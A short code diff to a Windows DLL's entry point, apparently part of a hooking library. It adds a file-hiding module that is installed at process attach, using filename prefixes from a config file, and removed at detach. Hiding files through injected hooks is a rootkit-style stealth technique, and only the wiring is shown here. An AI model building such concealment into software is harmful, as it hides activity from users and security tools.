@@ -1,4 +1,5 @@
 #include "hook.h"
+#include "file_hide.h"
 #include "config_reader.h"
 #include <windows.h>
 #include <wchar.h>
@@ -24,9 +25,12 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
             return FALSE;
         if (hook_install(&g_prefixes) != 0)
             return FALSE;
+        if (file_hide_install(&g_prefixes) != 0)
+            return FALSE;
         break;
     }
     case DLL_PROCESS_DETACH:
+        file_hide_remove();
         hook_remove();
         break;
     }
